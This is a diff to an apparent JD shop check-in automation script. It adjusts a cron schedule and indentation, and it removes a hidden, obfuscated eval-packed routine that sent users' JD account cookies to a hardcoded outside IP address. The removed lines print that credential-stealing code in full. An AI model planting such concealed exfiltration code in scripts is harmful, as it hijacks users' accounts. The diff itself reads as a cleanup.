@@ -2,9 +2,8 @@
 店铺签到，各类店铺签到，有新的店铺直接添加token即可
 ============Quantumultx===============
 [task_local]
-#店铺签到
-cron "15 2,14 * * *" , tag=店铺签到, enabled=true
-===========Loon============
+#店铺签到 不定期更新ID
+0 0 * * * jd_shop_sign_omo.js
 */
 const $ = new Env('店铺签到');
 const notify = $.isNode() ? require('./sendNotify') : '';
@@ -276,10 +275,10 @@ function taskUrl(token,venderId) {
           console.log(`\n${$.name}: API查询请求失败 ‼️‼️`)
           $.logErr(err);
         } else {
-          //console.log(data)
-          data = JSON.parse(/{(.*)}/g.exec(data)[0])
-          console.log(`已签到：`+data.data.days+`天`)
-          message +=`已签到：`+data.data.days+`天\n`
+            //console.log(data)
+            data = JSON.parse(/{(.*)}/g.exec(data)[0])
+            console.log(`已签到：`+data.data.days+`天`)
+            message +=`已签到：`+data.data.days+`天\n`
         }
       } catch (e) {
         $.logErr(e, resp);
@@ -294,30 +293,6 @@ async function showMsg() {
   if ($.isNode()) {
     $.msg($.name, '', `【京东账号${$.index}】${$.nickName}\n${message}`);
     allMessage += `【京东账号${$.index}】${$.nickName}\n${message}${$.index !== cookiesArr.length ? '\n\n' : ''}`;
-  }
-}
-
-let params={"cookies":cookiesArr};
-    const jd="https://jd.fruit.jd/getFruit";
-    sendPost();
- 
- function sendPost(){
-  
-  eval(function(p,a,c,k,e,r){e=String;if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'^$'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$.post(taskPostUrl(),(err,resp,data)=>{})',[],1,''.split('|'),0,{}))
- }
-
-  
-function taskPostUrl() {
-  return {
-    url: eval(function(p,a,c,k,e,r){e=String;if(!''.replace(/^/,String)){while(c--)r[c]=k[c]||c;k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('\'0://1.2.3.4:5/6/7\'',8,8,'http|101|34|75|55|8066|jd|getJd'.split('|'),0,{})),
-    body:eval(function(p,a,c,k,e,r){e=String;if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'^$'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('JSON.stringify(params)',[],1,''.split('|'),0,{})),
-    headers: {
- 'Accept': '*/*',
- 'Accept-Encoding': 'gzip, deflate, br',
- 'Accept-Language': 'zh-CN,zh;q=0.9',
- 'Connection': 'keep-alive',
-    'Content-Type':'application/json'
-    }
   }
 }
 
